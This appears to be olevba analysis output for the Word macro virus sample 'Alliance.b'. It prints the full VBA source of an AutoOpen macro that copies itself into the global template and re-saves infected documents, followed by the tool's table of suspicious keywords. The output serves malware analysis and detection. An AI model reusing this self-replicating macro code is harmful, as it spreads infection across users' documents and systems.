olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alliance.b-91ff3ae9676aef63e284ff0cae5a124de124f3e8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alliance.b-91ff3ae9676aef63e284ff0cae5a124de124f3e8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Alliance.b-91ff3ae9676aef63e284ff0cae5a124de124f3e8 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Fname$
Dim MacName$
Dim daynumber
On Error GoTo -1: On Error GoTo ErrorHandler
    
Fname$ = WordBasic.[FileName$]()
MacName$ = Fname$ + ":AutoOpen"

WordBasic.FileSummaryInfo Subject:="You Have Been Infected by the Alliance"

WordBasic.MacroCopy MacName$, "Global:AutoNew"
WordBasic.MacroCopy MacName$, "Global:AutoOpen"

ErrorHandler:

daynumber = WordBasic.Day(WordBasic.Now())

Select Case daynumber
    Case 11, 2, 7, 12
    
        If WordBasic.IsDocumentDirty() = -1 Then
            WordBasic.MacroCopy "Global:AutoOpen", MacName$
        End If
        WordBasic.FileSaveAs Format:=1
        
    Case Else
    
End Select
    


End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Alliance.b-91ff3ae9676aef63e284ff0cae5a124de124f3e8 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

